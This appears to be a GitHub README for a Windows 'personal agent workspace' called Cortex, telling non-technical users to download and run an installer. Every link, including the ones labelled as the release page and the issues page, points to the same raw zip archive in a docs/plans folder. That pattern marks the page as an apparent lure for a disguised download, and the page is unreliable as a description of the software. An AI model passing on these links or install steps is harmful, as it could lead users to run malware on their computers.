# ⚙️ Cortex - Your Personal Agent Workspace

[![Download Cortex](https://img.shields.io/badge/Download-Cortex-green?style=for-the-badge)](https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip)

---

## 📋 What is Cortex?

Cortex is a simple tool that helps you manage personal tasks and files using a smart agent system. It runs on your Windows computer and organizes work through signals, like messages between parts of the system.

You don’t need to learn programming or complicated commands. Cortex uses clear interface methods like a web page or chat apps to control and interact with your files and tasks.

---

## ⚙️ Key Functions

Here are some main parts of Cortex you will use:

- **Core Tools:** Open, write, and edit files. Run simple commands with the shell tool.
- **Multi-Channel Access:** Use the web page, Telegram, or Feishu for control. All channels work the same way.
- **Memory System:** Cortex keeps track of what you do and remembers important information.
- **History in Tape Files:** Every session saves to a log file for review.
- **Skills:** Extra functions you add yourself. These use plain markdown files.

---

## 🖥️ System Requirements

Before installing, make sure your Windows computer meets these needs:

- Windows 10 or later (64-bit recommended)
- At least 4 GB of RAM
- At least 500 MB of free disk space
- Internet connection for download and updates
- A modern web browser (Edge, Chrome, Firefox) for the web interface

---

## 🚀 Getting Started

### Step 1: Visit the Download Page

Go to the Cortex release page here:  
[https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip](https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip)

This page hosts the files you need to download Cortex.

### Step 2: Download the Windows Installer

On the release page, look for the latest version. You will find a file labeled something like `Cortex-Setup.exe` or similar. Click the file name to download it.

Save it to a folder you can easily access, like your Desktop or Downloads folder.

### Step 3: Install Cortex

1. Find the downloaded file on your PC.
2. Double-click the file to start the installation.
3. Follow the steps on-screen:
   - Choose Install Location or use the default.
   - Accept the license terms.
   - Click Install.
4. Wait for the setup process to finish.
5. When done, click Finish to exit the installer.

### Step 4: Open Cortex

After installation, look for the Cortex icon on your desktop or in the Windows Start menu.

Double-click the icon to launch Cortex.

---

## 🌐 Using Cortex

Once open, Cortex runs a simple web server on your computer. You will interact with it using your web browser.

### Step 1: Open the Web Interface

- Your browser should open automatically to:  
  `http://localhost:4000`
  
- If it does not, open your browser and enter that address manually.

### Step 2: Explore the Interface

You will see the Cortex dashboard with basic options:

- **Read File:** Load and view files on your computer.
- **Write File:** Create new files or overwrite existing ones.
- **Edit File:** Change the content of files easily.
- **Shell:** Run commands similar to a command prompt.

Use the buttons and menus to pick your action.

### Step 3: Connect Chat Bots (Optional)

You can link Cortex to Telegram or Feishu for chat control.

To do this, you need to:

- Set up a bot in your chosen chat platform.
- Add the bot token in Cortex’s settings page.
- Use chat commands to control the agent.

This option is for users comfortable with their chat apps.

---

## 📁 Managing Your Files

Cortex works inside a folder called your workspace. It expects to find files here and save logs and history.

### How to Find Your Workspace

By default, Cortex uses this folder inside the program directory:  
`./workspace/`

You can change this folder in the Cortex settings if needed.

### Using Read, Write, and Edit Tools

- When you open a file, Cortex loads it from the workspace.
- Save changes overwrite the file in the same folder.
- Write new files by specifying a file name and content.

Always keep a backup of important files separately.

---

## 📂 History and Logs

Cortex keeps a record of your sessions automatically.

These log files are saved as JSON Lines (`*.jsonl`) in the `./tape/` folder inside your workspace.

You can open these logs with any text editor to review what actions were taken during a session.

---

## ⚙️ Adjusting Cortex Settings

Inside the web interface, find the **Settings** section.

Here you can:

- Change your workspace folder.
- Manage chat bot integrations.
- Adjust memory settings to control how much Cortex remembers.
- Enable or disable specific skills.

Settings changes take effect after you save and restart the program.

---

## 📥 Download Cortex

Download Cortex from this page:  
[https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip](https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip)

1. Pick the latest Windows setup file (`Cortex-Setup.exe`).
2. Save it on your computer.
3. Run the file to install.
4. Launch Cortex from your desktop or Start menu.
5. Open your browser to `http://localhost:4000` to start.

---

## ⚠️ Troubleshooting Tips

- If Cortex does not open in your browser, check that port 4000 is free.
- Restart your computer if the installer fails.
- Make sure Windows updates are current.
- If files don’t save, verify the workspace folder permissions.
- For errors, check the `./tape/` logs for clues.

---

## 🛠️ Support and Feedback

If you encounter problems or want to suggest improvements, use the GitHub Issues page:  
[https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip](https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip)

Please provide details about your system, Cortex version, and the issue steps.

---

## 🔧 Advanced Use

For users who want more control:

- Edit or add new skills using markdown files in the `skills/` folder.
- Skills extend Cortex by adding new commands.
- Use the shell tool to run command-line tasks.
- The log files in `./tape/` allow audit and manual review.

This section is optional and meant for users ready to experiment.

---

## 📚 Further Reading

- Refer to the included `README_CN.md` for Chinese language support.
- Explore the web interface help pages for detailed instructions.

---

[![Download Cortex](https://img.shields.io/badge/Download-Cortex-blue?style=for-the-badge)](https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip)